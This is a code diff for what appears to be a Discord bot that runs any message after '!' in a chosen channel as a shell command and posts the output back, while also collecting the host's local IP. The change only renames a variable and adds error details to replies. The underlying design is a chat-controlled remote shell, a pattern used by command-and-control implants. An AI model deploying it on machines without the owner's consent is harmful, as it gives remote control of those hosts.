@@ -24,9 +24,9 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	channelID := setup()
-	os := runtime.GOOS
-	
-	if(os != "windows"){
+	operatingSystem := runtime.GOOS
+
+	if operatingSystem != "windows" {
 		if m.ChannelID == channelID {
 			if strings.Contains(m.Content, "!") {
 				command := m.Content[1:]
@@ -35,7 +35,7 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 				out, err := cmd.Output()
 				if err != nil {
 					fmt.Println(err, " on ", command)
-					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again."))
+					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again. error: " + err.Error()))
 				}
 
 				if len(out) > 2000 {
@@ -67,7 +67,7 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 				out, err := cmd.Output()
 				if err != nil {
 					fmt.Println(err, " on ", command)
-					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again. with error: " + err.Error()))
+					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again. error: " + err.Error()))
 				}
 	
 				if len(out) > 2000 {
@@ -90,6 +90,7 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 				s.ChannelMessageSend(m.ChannelID, string(out))
 			}
 		}
+	}
 }
 
 func getLocalIP() (string, error) {
